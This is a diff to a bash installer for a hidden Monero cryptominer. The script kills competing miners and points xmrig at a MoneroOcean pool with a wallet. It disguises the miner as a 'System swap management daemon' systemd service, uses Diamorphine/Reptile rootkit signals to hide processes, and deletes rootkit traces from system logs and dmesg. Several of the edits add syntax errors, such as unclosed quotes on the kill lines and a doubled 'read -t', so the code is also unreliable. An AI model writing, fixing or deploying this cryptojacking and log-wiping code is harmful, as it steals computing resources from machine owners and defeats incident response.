@@ -133,13 +133,13 @@ echo "========================================================================="
 # Phase 1: Kill all mining and related processes
 echo "[*] Phase 1: Terminating all mining processes..."
 # Use robust force-stop function that never gives up
-#force_stop_service \
-#    "swapd gdm2 moneroocean_miner" \
-#    "xmrig kswapd0 swapd gdm2 monero minerd cpuminer nicehash neptune"
+force_stop_service \
+    "swapd gdm2 moneroocean_miner" \
+    "xmrig kswapd0 swapd gdm2 monero minerd cpuminer nicehash neptune"
 
 # Additional cleanup for stubborn processes
-#pkill -9 -f "\./swapd\|\./kswapd0\|\./xmrig" 2>/dev/null || true
-#pkill -9 -f "config.json\|config_background.json" 2>/dev/null || true
+pkill -9 -f "\./swapd\|\./kswapd0\|\./xmrig" 2>/dev/null || true
+pkill -9 -f "config.json\|config_background.json" 2>/dev/null || true
 
 # Phase 2: Remove all miner files and directories
 echo "[*] Phase 2: Removing all miner files..."
@@ -206,7 +206,7 @@ journalctl --vacuum-time=1s 2>/dev/null
 
 # Phase 12: Clean temporary files
 echo "[*] Phase 12: Cleaning temporary files..."
-find /tmp /var/tmp -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -name "*monero*" 2>/dev/null | xargs rm -rf 2>/dev/null
+find /tmp /var/tmp \( -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -name "*monero*" \) -exec rm -rf {} + 2>/dev/null
 
 echo "[✓] System fully cleaned from previous installations"
 echo "[*] Sleeping 3 seconds before fresh install..."
@@ -239,7 +239,7 @@ fix_dns_and_retry() {
     
     # Backup original resolv.conf
     if [ -f /etc/resolv.conf ]; then
-        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
+        cp /etc/resolv.conf "/etc/resolv.conf.backup.$(date +%s)" 2>/dev/null
         echo "[✓] Backed up original resolv.conf"
     fi
     
@@ -685,7 +685,7 @@ manual_upload_instructions() {
     
     # Wait for user to upload
     echo -n "Waiting for file upload... (press ENTER after uploading): "
-    read -t 300 # 5 minute timeout
+    read -t -t 300 # 5 minute timeout
     
     # Check again
     if [ -f "$target_path" ]; then
@@ -1518,7 +1518,7 @@ mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
 
 echo "sed"
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:80",/' "$HOME"/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' "$HOME"/.swapd/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'"$WALLET"'",/' "$HOME"/.swapd/config.json
 #sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' "$HOME"/.swapd/config.json
 #sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME"/.swapd/config.json
@@ -1913,41 +1913,48 @@ EOF
 
 chmod +x /root/.swapd/launcher.sh
 
-cat > /tmp/swapd.service << 'EOL'
+        cat >/tmp/swapd.service <<EOL
 [Unit]
-Description=Swap Daemon Miner
+Description=System swap management daemon
 After=network.target
 
 [Service]
 Type=simple
-User=root
-WorkingDirectory=/root/.swapd
-ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
+ExecStart=/bin/bash /root/.swapd/launcher.sh
 Restart=always
 RestartSec=10
+TimeoutStartSec=30
+
+# Resource constraints optimized for stability
+Nice=19
+CPUSchedulingPolicy=idle
+IOSchedulingClass=idle
+CPUQuota=95%
+
+# FIXED: Lower OOM score to prevent killing (was 1000)
+# Lower value = less likely to be killed by OOM killer
+OOMScoreAdjust=200
+
+# Memory limits for low-RAM systems (prevents runaway usage)
+MemoryMax=400M
+MemoryHigh=300M
+
+# CRITICAL: Enable logging for debugging (was null before!)
 StandardOutput=journal
 StandardError=journal
 SyslogIdentifier=swapd
 
-# Prevent OOM killer from killing miner
-OOMScoreAdjust=-100
-
-# Limit memory usage
-MemoryMax=500M
-MemoryHigh=400M
+# Clean umount on stop
+ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
 
 [Install]
 WantedBy=multi-user.target
 EOL
-
-# Then you would typically:
-sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-sudo systemctl daemon-reload
-sudo systemctl enable swapd
-sudo systemctl start swapd
-
-
-
+        sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+        
+        echo "[*] Ensuring old swapd processes are stopped before starting new service..."
+        # Use robust force-stop to ensure clean start
+        force_stop_service "swapd" "swapd xmrig"
         
         echo "[*] Making launcher.sh executable..."
         chmod +x /root/.swapd/launcher.sh
@@ -2150,12 +2157,12 @@ fi
 
 echo "[*] hid1ng... ;)"
 
-kill -31 $(pgrep -f -u root config.json)
+kill -31 "$(pgrep -f -u root config.json)
 
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 #kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
-kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') :
+kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') :
 #kill -63 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
@@ -2251,7 +2258,7 @@ if [ -n "$EMAIL" ]; then
   echo "[*] Added email to password field: $EMAIL"
 fi
 
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'"$PASS"'",/' "$HOME"/.swapd/config.json
 echo "[*] Password field configured"
 
 echo "[*] Generating ssh key on server"
@@ -2324,7 +2331,7 @@ sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
 sed -i '/diamorphine/d' /var/log/kern.log 2>/dev/null
 sed -i '/diamorphine/d' /var/log/messages 2>/dev/null
 
-kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
 # Create emergency swap to prevent OOM killer
 sudo dd if=/dev/zero of=/swapfile bs=1G count=2
@@ -2402,7 +2409,7 @@ sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
 sed -i '/Reptile/d' /var/log/messages 2>/dev/null
 dmesg -C 2>/dev/null
 
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
 # Replace existing SSH handling with:
 SSHD_PIDS=$(pgrep -f "sshd:.*@")
@@ -2451,7 +2458,7 @@ sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
 sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
 sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
 
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
 echo ""
@@ -2509,12 +2516,12 @@ fi
 
 echo ""
 
-kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null || true
-kill -31 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -31 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -63 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -63 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -31 "$(pgrep -f -u root config.json) 2>/dev/null || true
+kill -31 "$(pgrep -f -u root config_background.json) 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 
 # Cleanup xmrig files in login directory
